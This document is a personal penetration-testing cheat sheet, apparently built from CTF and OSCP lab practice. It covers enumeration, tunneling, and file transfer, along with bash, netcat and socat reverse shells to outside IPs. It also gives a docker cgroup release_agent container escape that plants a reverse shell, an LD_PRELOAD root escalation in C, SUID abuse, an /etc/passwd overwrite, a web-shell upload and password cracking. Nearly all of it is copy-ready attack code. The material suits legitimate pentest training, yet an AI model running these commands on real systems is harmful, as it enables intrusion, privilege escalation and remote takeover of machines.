# Pentest

## Enumeration

### ****

### nmap

configure firewall to return RST when TCP port scan occurs (TCP SYN is spoofed)

```
iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
```

This can make it extremely difficult (if not impossible) to get an accurate reading of the target(s).

nmap scan with `nmap -sU --top-ports 20 <target>` to make it faster for UDP scans.&#x20;

nmap ping sweep : `nmap -sn 192.168.0.1-254`

```
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
```

https://nmap.org/nsedoc/

`-Pn` : don't ping host, avoid windows firewall, treat the host as being alive always use `-vv`, better to have more verbosity

#### Enumerate samba shares

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.170.159
```

#### Enumerate nfs

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.170.159
```

say that `/var` has been found, we can mount it locally like that:

```
mkdir tempnfs
sudo mount TARGET_IP:/var tempnfs
```

### **sqlmap**

in google chrome, open network, select call and and copy request header, paste it to a file req.txt

```
sqlmap -r req.txt 
```

## Networking

### **Tunneling**

Using socat ([static binaries](https://github.com/andrew-d/static-binaries))

Expose port 22 on 8888 (if 22 is only open to localhost for example)

```
socat -d -d TCP-LISTEN:8888,reuseaddr,fork TCP:localhost:22
```

Reverse tunnel :&#x20;

```bash
./chisel server -p 12312 --reverse # attacker
./chisel client 10.10.14.4:12312 R:3306:172.17.0.4:3306 #victim
mysql -uUSER -pPASSWORD -h 127.0.0.1 #attacker
```

### SIP / VoIP

{% embed url="https://www.kali.org/tools/sipvicious/" %}

### tcpdump

Packets that have the _PSH_ and _ACK_ flags turned on.&#x20;

* All packets sent and received after the initial 3-way handshake will have the _ACK_ flag set.&#x20;
* The _PSH_ flag is used to enforce immediate delivery of a packet and is commonly used in interactive _Application Layer_ protocols to avoid buffering

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

_ACK_ and _PSH_ are represented by the fourth and fifth bits of the 14th byte(\[13]), respectively

Turning on only these bits would give us _00011000_, or decimal 24.

```
sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

### DNS Enumeration

```
host -t mx megacorpone.com
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq  50 100); do host 38.100.193.$ip; done | grep -v "not found"
# DNS zone transfer
host -l DOMAIN DNS_SERVER
dnsrecon -d megacorpone.com -t axfr
dnsenum zonetransfer.me
# brute force
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```

```
# oscp exercise, figuring out domain from private dns
dig -x 192.168.151.149  @192.168.151.149
dig TXT @192.168.151.149 dc.MAILMAN.com 
```

#### **Brute force subdomains**

```bash
gobuster vhost -u cybercrafted.thm -w ~/pentest/wordlists/shubs-subdomains.txt 
```

```bash
wfuzz -c -f sub-fighter.txt -Z \
    -w ~/pentest/wordlists/shubs-subdomains.txt \
    -H "Host: FUZZ.cmess.thm" --hw 290 cmess.thm
```

## File transfer

Sending a file through netcat

```bash
# Receiver
nc -l -p 1234 > out.file

# Sender
nc -w 3 [destination] 1234 < out.file

```

## Reverse shell

```bash
bash -i >& /dev/tcp/10.9.6.147/4242 0>&1
nc -lvnp 4242
```

### Socat Reverse Shells

```bash
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

### Socat Encrypted Bind Shells

**openssl**

* req: initiate a new certificate signing request
* \-newkey: generate a new private key
* rsa:2048: use RSA encryption with a 2,048-bit key length.
* \-nodes: store the private key without passphrase protection
* \-keyout: save the key to a file
* \-x509: output a self-signed certificate instead of a certificate request
* \-days: set validity period in days
* \-out: save the certificate to a file

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat - OPENSSL:10.11.0.4:443,verify=0
```

\


### Get a pseudo terminal over netcat reverse shell

<pre class="language-bash"><code class="lang-bash">python -c 'import pty;pty.spawn("/bin/bash")' # or
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z , Enter 
<strong>stty raw -echo
</strong>fg
# Enter, Enter
export TERM=xterm-256-color</code></pre>

msfvenom : generate reverse shell #todo

## Privilege escalation

### SUID

#### Find suid

```bash
find / -perm -u=s -type f 2>/dev/null
```

#### Abuse python suid&#x20;

```bash
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### **Override /etc/passwd**

generate password salt

```
openssl passwd -1 -salt ignite pass123
# $1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```

Replace

```
jessie:x:1000:1000:jessie,,,:/home/jessie:/bin/bash
```

by

```
jessie:$SALT$:1000:1000:jessie,,,:/home/jessie:/bin/bash
```

### Escape docker privileged container to be run as root

{% embed url="https://thesecmaster.com/how-to-fix-cve-2022-0492-privilege-escalation-and-container-escape-vulnerabilities-in-cgroups/" %}

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation" %}

```bash
# Create new cgroup and namespace
unshare -UrmC bash
```

```bash
mount -t cgroup -o rdma cgroup /mnt
echo 1 > /mnt/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /mnt/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.147 4242 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /mnt/cgroup.procs"
```

### **LD\_PRELOAD**

if you see `env_keep+=LD_PRELOAD` in `sudo -l`, then, create `pe.c` :

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then compile it using:

```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finally, escalate privileges running

```bash
sudo LD_PRELOAD=pe.so <COMMAND> # Use any command you can run with sudo
```

## Cryptography

Get SSL certificate from pcap

```bash
binwalk capture.pcap --dd=.*
```

Check certificate

```bash
openssl x509 -in cert.der -inform DER -text
```

Standard sizes for RSA keys :

| Key size   | Key strength           |
| ---------- | ---------------------- |
| 512 bits   | Low-strength key       |
| 1024 bits  | Medium-strength key    |
| 2048  bits | High-strength key      |
| 4096 bits  | Very high-strength key |

Generate private RSA key from weak one : [https://github.com/RsaCtfTool/RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)



## Cracking

### John

have a hash.txt file containing

```
username:hash
```

then run :

```
john --wordlist=~/pentest/wordlist/rockyou.txt --format=raw-md5 hash.txt
```

word mangling: markus --> Markus1, Markus2, Markus3, MArkus, MARkus, MARKus, Markus!

```bash
john --single --format=[format] [path to file]
```

Cracking with salt

in the hash.txt file, put \[HASH]$\[SALT]

```bash
john --wordlist=~/pentest/wordlist/rockyou.txt \
    --format='dynamic=sha512($p.$s)' hash.txt
```

## Escape

Alternative to `cat` :&#x20;

```bash
cp FILE /dev/stdout
```

